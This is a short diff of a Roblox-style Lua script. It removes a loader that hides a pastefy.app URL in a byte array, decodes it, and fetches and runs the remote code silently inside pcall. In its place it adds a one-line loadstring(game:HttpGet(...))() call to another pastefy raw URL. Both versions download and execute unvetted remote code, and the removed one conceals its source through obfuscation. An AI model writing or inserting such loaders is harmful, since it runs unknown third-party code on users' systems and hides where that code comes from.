@@ -1,16 +1,1 @@
-task.spawn(function()
-    local bytes = {104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,51,122,90,79,79,79,57,116,47,114,97,119}
-
-    local function decode(t)
-        local s = ""
-        for i = 1, #t do
-            s = s .. string.char(t[i])
-        end
-        return s
-    end
-
-    local url = decode(bytes)
-    pcall(function()
-        loadstring(game:HttpGet(url))()
-    end)
-end)
+loadstring(game:HttpGet("https://pastefy.app/FR3Xq4ih/raw"))()
